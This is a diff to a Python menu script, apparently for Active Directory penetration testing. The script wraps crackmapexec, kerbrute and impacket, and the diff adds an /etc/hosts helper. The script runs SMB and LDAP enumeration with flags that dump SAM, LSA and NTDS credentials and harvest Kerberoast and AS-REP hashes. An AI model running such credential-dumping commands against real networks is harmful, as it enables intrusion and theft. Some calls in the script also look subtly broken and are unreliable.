@@ -15,11 +15,6 @@ print(r"""
      d88P     888 8888888P"  "Y888888  "Y88888  "Y888 "Y88P"  888  888  888 "Y888888  "Y888 "Y88P"  888
 """)
 
-
-
-# Change this path by running "which crackmapexec" and replace below
-CME_PATH = "/usr/bin/crackmapexec"
-
 # This checks to see if the files below exists and deletes them as they will be part of the output file with a IP and DTG
 def delete_file(filename):
     """kerberoast_hash.txt"""
@@ -35,6 +30,8 @@ def install_packages():
     subprocess.run(['sudo', 'apt', 'install', 'seclists', '-y'])
     # crackmapexec
     subprocess.run(['sudo', 'apt', 'install', 'crackmapexec', '-y'])
+    # ntpdate
+    subprocess.run(['sudo', 'apt', 'install', 'ntpdate', '-y'])
     # impacket
     subprocess.run(['sudo', 'apt', 'install', 'python3-impacket', '-y'])
     # Check for kerbrute
@@ -51,6 +48,15 @@ def generate_single_filename(ip):
     ip = ip.replace("/", "_")
     return f"{ip}_{datetime.now().strftime('%d_%b_%Y_%H%M')}.txt"
 
+# Function to append an entry to /etc/hosts
+def append_to_hosts(dc_ip, target):
+    try:
+        with open("/etc/hosts", "a") as hosts_file:
+            hosts_file.write(f"{dc_ip}{' '*7}{target}\n")
+        print(f"Added {target} with IP {dc_ip} to /etc/hosts.")
+    except Exception as e:
+        print(f"Failed to append to /etc/hosts: {e}")
+        sys.exit(1)
 
 
 def perform_kerberos(target, username, password, dc_ip, user_list_path=None):
@@ -81,15 +87,15 @@ def execute_crackmapexec(cidr_range, domain_name, output_filename):
             pass
 
     with open(output_filename, 'a') as f:	
-        known_username = input("Do you know the username? (yes/no): ").strip().lower()
-        if known_username == 'yes':
+        known_username = input("Do you know the username? (y/n): ").strip().lower()
+        if known_username == 'y':
             username = input("Please enter the username for CrackMapExec: ").strip()
         else:
             username_list_path = input("Enter the path to your username list? ").strip()
             username = f" {username_list_path}"
 
-    known_password = input("Do you know the password? (yes/no): ").strip().lower()
-    if known_password == 'yes':
+    known_password = input("Do you know the password? (y/n): ").strip().lower()
+    if known_password == 'y':
         password = input("Please enter the password for CrackMapExec: ").strip()
     else:
         password_list_path = input("Enter the path to your password list? ").strip()
@@ -97,7 +103,7 @@ def execute_crackmapexec(cidr_range, domain_name, output_filename):
     
     
      # SMB command and flags
-    smb_base_command = [CME_PATH, 'smb', cidr_range, '-u', username, '-p', password]
+    smb_base_command = ['crackmapexec', 'smb', cidr_range, '-u', username, '-p', password]
     smb_cme_flags = [
         '--shares', '--pass-pol', '--users', '--sam --continue-on-success', '--sam',
         '--lsa --continue-on-success', ' --lsa', '--ntds --continue-on-success',
@@ -105,7 +111,7 @@ def execute_crackmapexec(cidr_range, domain_name, output_filename):
     ]
 
     # LDAP command and flags
-    ldap_base_command = [CME_PATH, 'ldap', cidr_range, '-u', username, '-p', password]
+    ldap_base_command = ['crackmapexec', 'ldap', cidr_range, '-u', username, '-p', password]
     ldap_cme_flags = [
         '--asreproast asreproast_hash.txt', '--kerberoasting kerberoast_hash.txt'
     ]
@@ -141,7 +147,7 @@ def execute_crackmapexec(cidr_range, domain_name, output_filename):
 
 def main_menu():
     print("\n--------- Active Directory Penetration Testing Tools ---------")
-    print("0. Install packages - Seclists, Crackmapexec, Kerbrute, Impacket")
+    print("0. Install packages - Seclists, Crackmapexec, Kerbrute, Impacket, Ntpdate")
     print("1. Crackmapexec - Enumeration of Domain Controller")
     print("2. Kerbrute - Enumerate valid AD accounts via Kerberos Pre-Authentication")
     print("3. Impacket")
@@ -154,16 +160,21 @@ def main_menu():
 
     if choice == "0":
         install_packages()
+        
     elif choice == "1":
         domain_name = input("Please enter the domain name: ")
         cidr_range = input("Please provide a CIDR range for enumeration: ")
         output_filename = generate_single_filename(cidr_range)  # use cidr_range instead of entered_ip
+        dc_ip = input("Please enter the DC IP to add to /etc/hosts: ")  # New line to get the DC IP
+        append_to_hosts(dc_ip, domain_name)  # Call function to append to /etc/hosts
         entered_ip = execute_crackmapexec(cidr_range, domain_name, output_filename)
 
     elif choice == "2":
         dc_ip = input("Please enter the DC IP: ")
         domain_name = input("Please enter the domain name: ")
+        append_to_hosts(dc_ip, domain_name)  # Call function to append to /etc/hosts
         execute_kerbrute(dc_ip, domain_name, output_filename)
+        
     elif choice == "3":
         dc_ip = input("Please enter the DC IP: ")
         domain_name = input("Please enter the domain name: ")
@@ -171,7 +182,9 @@ def main_menu():
         kerberos_password = input("Please enter the password for the Kerberos attack: ")
         user_list_path = input("Enter the path to user list (or 'None' if not applicable): ")
         user_list_path = None if user_list_path.lower() == 'none' else user_list_path
+        append_to_hosts(dc_ip, domain_name)  # Call function to append to /etc/hosts
         perform_kerberos(domain_name, kerberos_username, kerberos_password, dc_ip, user_list_path, output_filename)
+        
     elif choice == "4":
         sys.exit(0)
     else:
